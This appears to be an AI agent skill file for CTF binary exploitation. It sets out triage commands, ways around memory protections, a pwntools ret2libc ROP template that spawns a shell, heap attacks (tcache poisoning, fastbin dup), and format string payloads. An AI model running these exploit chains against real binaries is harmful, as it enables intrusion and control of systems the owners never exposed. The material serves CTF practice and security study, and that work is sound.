---
name: cypher-pwn
description: Binary exploitation guidance covering stack buffer overflows, heap exploitation, format string attacks, integer overflows, ROP/JOP chains, ret2libc, GOT/PLT overwrites, and modern binary defenses (ASLR/NX/PIE/Canary/RELRO).
version: 0.1.0
cwe: [CWE-120, CWE-122, CWE-134, CWE-190, CWE-787, CWE-416, CWE-843]
finding_types: [BINARY_FINDING, EXPLOIT_PRIMITIVE, EXPLOIT_RESULT, SESSION, BLOCKER]
destructiveness: low
tags: [ctf, pwn, binary, exploitation, rop, heap]
---

# Cypher Pwn / Binary Exploitation Skill

Use this skill for CTF pwn challenges, binary exploitation research, and vulnerability assessment of compiled binaries.

Treat the techniques, commands, and exploit snippets below as optional references. Select them only when binary protections, crash evidence, target architecture, and the goal justify that path.

## Initial triage

```bash
file ./binary                # ELF/PE/Mach-O, 32/64-bit, static/dynamic
checksec ./binary            # pwntools: ASLR, NX, PIE, Canary, RELRO, Fortify
strings ./binary             # Embedded strings, function names, flag paths
readelf -a ./binary          # ELF structure
objdump -d ./binary          # Disassembly (specific functions)
ltrace ./binary              # Library call tracing
strace ./binary              # Syscall tracing
```

## Checksec defenses and bypasses

| Protection | Bypass |
|-----------|--------|
| NX (non-executable stack) | ROP, ret2libc, ret2dlresolve |
| Stack Canary | Leak canary first (format string, arbitrary read), fork-based brute-force |
| PIE (position-independent) | Leak base address (format string, unsorted bin pointers), partial overwrite |
| Full RELRO | Can't overwrite GOT — target libc function pointers, `__free_hook`, `__malloc_hook`, `_IO_FILE` vtable |
| ASLR | Info leak required; if none, brute-force (local), ret2dlresolve, ret2csu |

## Stack buffer overflow

### Classic (no canary, no PIE)
1. Find offset to return address: `cyclic 200` → find EIP/RIP offset → `cyclic -l <addr>`
2. Control EIP/RIP: place target address at offset
3. Payload: `padding + target_addr`

### ret2win (no PIE, NX enabled)
- Find a `win()` / `system("/bin/cat flag")` function: `objdump -d ./binary | grep win`
- Payload: `padding + win_addr`

### ret2libc (ASLR, NX; requires libc leak)
1. Leak libc address via `puts@plt(&puts@got)` or `printf@plt(&printf@got)`
2. Return to main/vuln function for second stage
3. Compute libc base from leaked address using libc database (libc.rip, libc-database)
4. Second stage: `system("/bin/sh")` at computed offset
5. Payload: `padding + pop_rdi_ret + binsh_addr + ret + system_addr`

### ROP chain template (pwntools)
```python
from pwn import *
context.arch = 'amd64'
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Stage 1: leak libc address
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])  # return to main
p.sendline(b'A' * offset + rop.chain())

# Parse leaked address, compute libc base
libc.address = leaked_puts - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Stage 2: get shell
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])
p.sendline(b'A' * offset + rop2.chain())
p.interactive()
```

## Heap exploitation

| Vulnerability | Technique |
|--------------|-----------|
| Use-after-free (UAF) | Overwrite freed chunk metadata, tcache poisoning |
| Double free | tcache dup, fastbin dup |
| Heap overflow | Overwrite adjacent chunk metadata, unlink attack |
| Off-by-one | Poison null byte (shrink chunk, consolidate backward) |
| House of Force | Corrupt top chunk size → arbitrary allocation |

### tcache poisoning (glibc 2.26+)
```python
# Requires: UAF or double free in tcache
malloc(0x28, b'A' * 0x28)  # chunk A
free(chunk_a)               # tcache[0x30] → A
# UAF or double free: modify A's fd pointer
edit(chunk_a, p64(target_addr))
malloc(0x28)                # returns A
malloc(0x28)                # returns target_addr — arbitrary write!
```

### Fastbin dup (glibc < 2.26 or when tcache is full)
```python
free(chunk_a)
free(chunk_b)
free(chunk_a)  # double free — fastbin: A → B → A
# Allocate and poison fd
malloc(size, p64(target_addr))
malloc(size)  # B
malloc(size)  # A
malloc(size)  # target_addr — arbitrary write
```

## Format string attacks

### Detection
- Input contains `%x`, `%p`, `%s`, `%n` and these are passed directly to `printf()` / `sprintf()` / `fprintf()` without a format string.

### Information leak
```
%p.%p.%p.%p.%p.%p.%p.%p   # dump stack — find libc addresses, canary, stack addresses
%7$p                       # read 7th argument
%s                         # crash reading arbitrary address (useful for ASLR info)
```

### Arbitrary write with %n
1. Place target address on stack (as part of input)
2. Find its position on the stack: `AAAA%7$p` → find offset where "AAAA" appears
3. Write to it: `%<value>c%<offset>$n` (write byte), `%<offset>$hn` (write short), `%<offset>$hhn` (write single byte)
4. For GOT overwrite: write bytes of system() to GOT entry of printf()/puts() one byte at a time

### Automating with pwntools
```python
payload = fmtstr_payload(offset, {target_addr: desired_value}, write_size='short')
```

## Integer overflow / underflow

```c
// Allocation: size * sizeof(struct) can overflow
size_t num = user_controlled;
buf = malloc(num * sizeof(element));  // if num = 0x4000000000000001 and sizeof=16, wraps to 16
// Copy: n * size wraps
memcpy(dst, src, user_len * sizeof(int));  // small copy, later access triggers OOB
```

Check for `size_t`, `unsigned int`, multiplication, and addition with user input.

## Evidence rules

- Save the exploit script to `/mnt/project/exploit/solve.py` (pwntools) or equivalent.
- Save exploit output/log showing flag or shell to `/mnt/project/exploit/solve.log`.
- Document: binary protections, vulnerability type, technique, and step-by-step exploitation steps.
- If a libc is provided, note the version and offsets. If not, use libc-database to identify.

## Prefix examples

```text
[cypher:finding type=BINARY_FINDING confidence=0.95 severity=high tags=ctf,pwn,stack-buffer-overflow artifacts=/mnt/project/vuln-research/pwn-checksec.txt cleanup=none] 64-bit ELF, No PIE, No Canary, NX enabled. `gets()` in `vuln()` allows stack overflow at offset 40 — ret2libc viable.
```

```text
[cypher:finding type=EXPLOIT_RESULT confidence=1.0 severity=critical tags=ctf,pwn,rop artifacts=/mnt/project/exploit/solve.py cleanup=none] Two-stage ret2libc exploit using puts leak → libc-database → system("/bin/sh"). Recovered flag{ROP_chain_master_2024}.
```
